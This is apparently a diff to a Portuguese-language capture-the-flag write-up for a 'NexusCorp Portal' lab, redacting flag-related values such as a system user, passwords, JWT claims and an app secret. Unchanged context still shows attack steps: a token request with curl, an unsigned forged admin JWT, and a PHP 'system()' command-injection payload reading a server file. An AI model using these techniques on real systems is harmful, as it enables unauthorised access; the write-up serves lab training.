@@ -159,7 +159,7 @@ const CONFIG = {
     apiBase: '/api',
     // Encryption key for backup config decryption - AES-ECB-128
     _backupKey: '<********?>',   // pad to 16 bytes
-    appVersion: '2.3.1'
+    appVersion: '*.*.*'
 };
 ```
 
@@ -188,13 +188,13 @@ print(plaintext.decode())
 ```json
 {
   "app_name": "NexusCorp Portal",
-  "version": "2.3.1",
+  "version": "*.*.*",
   "deploy_env": "production",
-  "system_user": "devops"
+  "system_user": "**++*"
 }
 ```
 
-> 🔎 O campo `system_user: devops` confirma um usuário do sistema chamado `devops` — informação crucial para a **Flag 4**.
+> 🔎 O campo `system_user: ****` confirma um usuário do sistema chamado `****` — informação crucial para a **Flag 4**.
 
 > 📝 **Nota:** `README`, `*.enc`, `*.bak`, `app.js` e `config.*` são fontes de ouro para credenciais. Sempre enumere `/backup/`, `/static/`, `/js/`, `/assets/` e baixe tudo.
 
@@ -271,7 +271,7 @@ O `files.php` exige JWT. O endpoint `/api/auth/token.php` emite tokens:
 ```bash
 curl -s http://<TARGET_IP>/api/auth/token.php \
   -H "Content-Type: application/json" \
-  -d '{"username":"robert.wilson","password":"password"}'
+  -d '{"username":"robert.wilson","password":"******"}'
 ```
 
 **Resultado:**
@@ -320,7 +320,7 @@ def b64(d):
     ).rstrip(b'=').decode()
 
 header  = b64({"alg": "HS256", "typ": "JWT"})
-payload = b64({"sub": "laura.hayes", "role": "admin"})
+payload = b64({"sub": "******", "role": "*******"})
 
 print(f"{header}.{payload}.fakesignature")
 ```
@@ -473,10 +473,10 @@ echo 'system("cat /opt/admin_bot.py");' > payload.txt
 ```python
 DB_CONFIG = dict(host="localhost", database="nexusdb",
   user="app_user", password="*********", ...)
-APP_SECRET = "nexus_app_k3y_2024"
+APP_SECRET = "******************"
 ```
 
-> 💡 A senha `********` é literalmente `DevOps`. O `system_user: devops` (do `config.enc`) já tinha aparecido. **Hipótese:** a senha do banco é a mesma do usuário do sistema.
+> 💡 A senha `********` é literalmente `******`. O `system_user: *****` (do `config.enc`) já tinha aparecido. **Hipótese:** a senha do banco é a mesma do usuário do sistema.
 
 ### Tentativa via `su` — falha
 
